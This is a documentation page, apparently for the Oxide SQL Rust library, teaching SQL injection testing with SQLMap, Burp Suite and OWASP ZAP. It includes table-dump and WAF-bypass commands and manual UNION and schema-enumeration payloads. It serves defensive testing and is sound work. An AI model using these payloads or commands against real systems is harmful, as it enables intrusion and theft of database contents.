---
sidebar_position: 8
---

# Security Testing for SQL Injection

This guide covers tools and techniques for identifying SQL injection
vulnerabilities in applications.

## Automated Tools

### SQLMap

The most popular open-source SQL injection detection and exploitation tool.

**Basic Usage:**

```bash
# Test a URL parameter
sqlmap -u "http://example.com/page?id=1"

# Test with cookies (authenticated session)
sqlmap -u "http://example.com/page?id=1" --cookie="PHPSESSID=abc123"

# Use a request file from Burp Suite
sqlmap -r request.txt
```

**Database Enumeration:**

```bash
# List databases
sqlmap -u "http://example.com/page?id=1" --dbs

# List tables in a database
sqlmap -u "http://example.com/page?id=1" -D database --tables

# Dump a specific table
sqlmap -u "http://example.com/page?id=1" -D database -T users --dump
```

**Advanced Options:**

```bash
# Specify database type
sqlmap -u "URL" --dbms=mysql

# Increase level and risk for thorough testing
sqlmap -u "URL" --level=5 --risk=3

# Test all parameters
sqlmap -u "URL" -p "param1,param2"

# Use tamper scripts to bypass WAF
sqlmap -u "URL" --tamper=space2comment,randomcase
```

### Burp Suite

Professional web security testing platform.

**SQL Injection Testing Workflow:**

1. **Capture requests** in Proxy > HTTP history
2. **Active scanning** (Professional edition): Right-click → "Do active scan"
3. **Manual testing** with Intruder:
   - Send request to Intruder
   - Mark injection points
   - Load SQL injection payload list
   - Analyze response variations

### OWASP ZAP

Free, open-source alternative to Burp Suite.

**Features:**

- Automated scanner for SQL injection
- Manual testing tools
- API support for CI/CD integration

## Manual Testing Techniques

### Initial Detection

```
' (single quote - check for errors)
" (double quote)
; (semicolon)
-- (SQL comment)
/* comment */
' OR '1'='1
' OR '1'='1'--
' AND '1'='2
```

### Database Fingerprinting

**MySQL:**

```sql
' AND @@version--
' UNION SELECT @@version,NULL--
```

**PostgreSQL:**

```sql
' AND version()--
```

**SQL Server:**

```sql
' AND @@VERSION--
```

**Oracle:**

```sql
' AND banner FROM v$version--
```

### Information Schema Enumeration

**List databases (MySQL):**

```sql
' UNION SELECT schema_name,NULL FROM information_schema.schemata--
```

**List tables:**

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables
  WHERE table_schema='database_name'--
```

**List columns:**

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns
  WHERE table_name='users'--
```

## Testing Tools Comparison

| Tool | Type | Best For |
| ---- | ---- | -------- |
| SQLMap | CLI | Automated exploitation |
| Burp Suite | GUI | Manual + automated testing |
| OWASP ZAP | GUI | Free automated scanning |
| jSQL Injection | GUI | Visual SQL injection testing |
| NoSQLMap | CLI | NoSQL injection testing |

## CI/CD Integration

### GitHub Actions Example

```yaml
name: Security Scan

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Start application
        run: docker-compose up -d

      - name: Run OWASP ZAP Scan
        uses: zaproxy/action-baseline@v0.9.0
        with:
          target: 'http://localhost:8080'

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: zap-results
          path: zap_report.html
```

## Best Practices for Security Testing

1. **Test in staging environments** - Never test on production
2. **Document all findings** - Use a consistent format
3. **Verify false positives** - Automated tools produce noise
4. **Test all input vectors** - Forms, headers, cookies, JSON
5. **Regular testing** - Include in CI/CD pipeline
6. **Keep tools updated** - New vulnerabilities discovered regularly

## Responsible Disclosure

If you find SQL injection vulnerabilities:

1. Document the vulnerability clearly
2. Report to the organization's security team
3. Do not exploit beyond proof of concept
4. Allow reasonable time for fixes before public disclosure
5. Follow the organization's vulnerability disclosure policy

## Using Oxide SQL for Secure Development

While testing tools help find vulnerabilities, preventing them is better. Oxide
SQL provides compile-time guarantees:

```rust
use oxide_sql_core::builder::{Select, col};

// Every query is safe by construction
let (sql, params) = Select::new()
    .columns(&["*"])
    .from("users")
    .where_clause(col("username").eq(user_input))
    .build();
```

With Oxide SQL, there's nothing to test for - SQL injection is impossible
through the type-safe API.

## References

- [SQLMap Documentation](https://sqlmap.org/)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
